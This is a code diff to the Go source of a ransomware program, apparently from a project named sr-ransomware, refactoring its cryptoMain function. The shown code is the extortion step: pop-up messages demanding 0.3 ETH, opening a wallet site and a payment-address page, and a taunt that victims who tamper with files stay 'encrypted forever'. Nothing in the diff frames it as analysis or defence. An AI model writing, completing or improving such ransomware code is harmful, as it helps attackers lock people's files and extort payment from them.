@@ -8,7 +8,6 @@ import (
     "sync"
     "runtime"
     "path/filepath"
-    "encoding/binary"
 
     "github.com/kernullist/gowinsvc"
     "github.com/sug0/sr-ransomware/go/win"
@@ -54,15 +53,9 @@ func cryptoMain() {
         win.MB_OK | win.MB_ICONWARNING,
     )
     win.ShellExecute("open", "https://www.myetherwallet.com/", "", win.SW_SHOW)
+
     wallet, err := victim.ImportEthereumWallet()
-    if err == nil {
-        win.MessageBox(
-            "Sweet, okay, who do I need to pay?",
-            "Send 0.3 ETH to the address that will open in your browser!",
-            win.MB_OK | win.MB_ICONWARNING,
-        )
-        win.ShellExecute("open", "https://ethplorer.io/address/"+wallet, "", win.SW_SHOW)
-    } else {
+    if err != nil {
         win.MessageBox(
             "Sweet, okay, who do I need to pay?",
             "Unfortunately, you have been dumb enough to tamper with our files. Stay encrypted forever, now. :)",
@@ -70,6 +63,13 @@ func cryptoMain() {
         )
         return
     }
+
+    win.MessageBox(
+        "Sweet, okay, who do I need to pay?",
+        "Send 0.3 ETH to the address that will open in your browser!",
+        win.MB_OK | win.MB_ICONWARNING,
+    )
+    win.ShellExecute("open", "https://ethplorer.io/address/"+wallet, "", win.SW_SHOW)
 
     code, _ := win.MessageBox(
         "Pay status",
